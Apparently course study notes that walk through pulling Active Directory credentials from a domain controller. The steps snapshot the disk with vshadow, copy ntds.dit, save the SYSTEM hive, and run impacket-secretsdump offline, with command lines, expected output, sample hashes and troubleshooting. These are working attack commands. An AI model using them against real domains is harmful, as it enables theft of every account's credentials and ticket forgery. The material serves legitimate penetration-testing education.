## Overview

A **Shadow Copy** is a snapshot of a file system volume.

In Windows, this is handled by:

```text
Volume Shadow Copy Service
VSS
```

Administrators can use VSS to create backups of files that are normally locked while Windows is running.

For Active Directory attacks, this matters because the main AD database file is usually locked:

```text
C:\Windows\NTDS\ntds.dit
```

Using a Shadow Copy, a Domain Admin can copy `ntds.dit` from the snapshot instead of from the live file system.

---

# Simple Mental Model

The live AD database is locked:

```text
C:\Windows\NTDS\ntds.dit
```

So instead of copying it directly, create a snapshot:

```text
Shadow Copy of C:
```

Then copy `ntds.dit` from the snapshot:

```text
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\windows\ntds\ntds.dit
```

Then save the SYSTEM hive:

```text
C:\system.bak
```

Move both files to Kali and extract hashes offline:

```text
ntds.dit.bak
+
system.bak
+
impacket-secretsdump
=
NTLM hashes and Kerberos keys for domain accounts
```

---

# Why the SYSTEM Hive Is Needed

The AD database contains encrypted credential material.

To decrypt it offline, `secretsdump` also needs the SYSTEM registry hive.

Required files:

```text
ntds.dit
SYSTEM hive
```

Why:

```text
The SYSTEM hive contains boot key material needed to decrypt secrets from ntds.dit.
```

---

# Required Access

This technique requires high privileges.

In the lesson:

```text
corp\jeffadmin
```

is a Domain Admin and logs into:

```text
DC1
```

Required conditions:

```text
Domain Admin or equivalent access
access to the domain controller
ability to run vshadow.exe
ability to copy files from the Shadow Copy
ability to save the SYSTEM hive
ability to transfer files to Kali
```

> [!warning]
> Extracting `ntds.dit` from a domain controller is a severe credential access technique. It can expose hashes and Kerberos keys for every domain account.

# Attack Flow

```text
1. Log in to the domain controller as a Domain Admin.
2. Create a Shadow Copy of the C: drive.
3. Note the Shadow Copy device path.
4. Copy ntds.dit from the Shadow Copy.
5. Save the SYSTEM registry hive.
6. Transfer both files to Kali.
7. Run impacket-secretsdump locally.
8. Extract NTLM hashes and Kerberos keys.
9. Crack or reuse hashes where authorized.
```

---

# Step 1 – Create a Shadow Copy

Run from an elevated command prompt on the domain controller:

```cmd
vshadow.exe -nw -p C:
```

Options:

| Option | Meaning |
|---|---|
| `-nw` | No writers; speeds up snapshot creation |
| `-p` | Persistent; stores the shadow copy on disk |
| `C:` | Volume to snapshot |

Important value:


This is the snapshot path.

# Step 2 – Copy NTDS.dit from the Shadow Copy

Use the Shadow Copy device path and append the NTDS path:

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

Expected output:

```text
1 file(s) copied.
```

Result:

```text
C:\ntds.dit.bak
```

---

# Step 3 – Save the SYSTEM Hive

Run:

```cmd
reg.exe save hklm\system c:\system.bak
```

Expected output:

```text
The operation completed successfully.
```

Result:

```text
C:\system.bak
```

---

# Step 4 – Transfer Files to Kali

Move these files to Kali:

```text
ntds.dit.bak
system.bak
```

These two files are enough to extract domain credential material offline.

---

# Step 5 – Extract Hashes with secretsdump

On Kali:

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

Options:

| Option | Meaning |
|---|---|
| `-ntds ntds.dit.bak` | AD database file |
| `-system system.bak` | SYSTEM registry hive |
| `LOCAL` | Parse local files instead of connecting remotely |

# secretsdump Output Format

Typical line:

```text
username:rid:lmhash:nthash:::
```

Example:

```text
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
```

Field breakdown:

| Field | Example |
|---|---|
| Username | `dave` |
| RID | `1103` |
| LM hash | `aad3b435b51404eeaad3b435b51404ee` |
| NT hash | `08d7a47a6f9f66b97b1bae4178747494` |

The common LM hash value:

```text
aad3b435b51404eeaad3b435b51404ee
```

usually means:

```text
LM hash is empty or disabled.
```

# Shadow Copy vs DCSync

| Technique | How It Works | Requires |
|---|---|---|
| Shadow Copy NTDS extraction | Copy `ntds.dit` and SYSTEM hive from DC | High privilege on DC |
| DCSync | Abuse replication to request credentials | Replication rights |

Plain English:

```text
Shadow Copy copies the domain database.
DCSync asks the domain controller to replicate credential data.
```

The notes mention that DCSync may be less conspicuous because it abuses AD replication functionality rather than creating/copying database files from disk.

# Troubleshooting

## vshadow Fails

Possible causes:

```text
not running elevated
vshadow.exe not available
insufficient privileges
VSS service issue
volume path incorrect
security tooling blocks execution
```

Check:

```text
run as administrator
confirm vshadow path
confirm target volume is C:
```

---

## Cannot Copy NTDS.dit

Possible causes:

```text
wrong Shadow Copy device path
snapshot expired or removed
path typo
insufficient permissions
file path case/format issue
```

Correct path shape:

```text
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\windows\ntds\ntds.dit
```

---

## secretsdump Fails

Possible causes:

```text
missing SYSTEM hive
wrong SYSTEM hive
corrupt ntds.dit copy
file transfer corrupted files
wrong command syntax
using remote syntax instead of LOCAL
```

Correct local syntax:

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

---

## No krbtgt Hash Found

Possible causes:

```text
wrong database file
incomplete extraction
not parsing domain NTDS.dit
tool error
```

Verify:

```text
secretsdump output includes domain users
secretsdump output includes RID 502
```

`krbtgt` RID:

```text
502
```

# Key Takeaways

- Shadow Copies are VSS snapshots of files or volumes.
- `vshadow.exe` can create a snapshot of the DC’s `C:` drive.
- A Shadow Copy can expose a readable copy of `ntds.dit`.
- `ntds.dit` is the Active Directory database.
- The SYSTEM hive is needed to decrypt credential material from `ntds.dit`.
- `reg.exe save hklm\system` saves the SYSTEM hive.
- `impacket-secretsdump` can parse `ntds.dit` and SYSTEM hive offline.
- Successful extraction can reveal every domain user’s NTLM hash and Kerberos keys.
- The `krbtgt` hash is especially sensitive because it enables Golden Tickets.
- This technique requires very high privilege and creates file/system artifacts.
- DCSync may be an alternative when replication rights are available.
- Treat extracted `ntds.dit`, SYSTEM hives, hashes, and Kerberos keys as highly sensitive evidence.
